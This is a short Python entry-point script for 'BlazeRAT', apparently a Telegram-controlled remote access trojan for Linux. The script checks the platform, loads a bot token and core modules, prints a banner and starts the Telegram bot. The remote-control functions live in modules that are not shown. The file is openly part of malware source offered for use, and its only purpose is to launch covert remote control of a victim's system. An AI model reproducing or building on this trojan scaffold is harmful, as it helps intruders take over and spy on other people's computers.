#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : LimerBoy
# github.com/LimerBoy/BlazeRAT

# Check python version and platform
from sys import version_info, platform, exit
assert 3 <= version_info.major, "[!] Python >3.8 required to run script!"
assert platform[:3] != "win", "[!] Script created only for Linux systems!"

# Import modules
from config import token
import core.telegram as TelegramBot
import core.cli as CommandLineInterface

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    Main file.
"""

# Parse args
print(CommandLineInterface.banner)
CommandLineInterface.ParseArgs()

# Check if token exists
if not token:
    exit("[!] Telegram API token not initialized")

# Start telegram bot
if __name__ == "__main__":
    TelegramBot.Run()
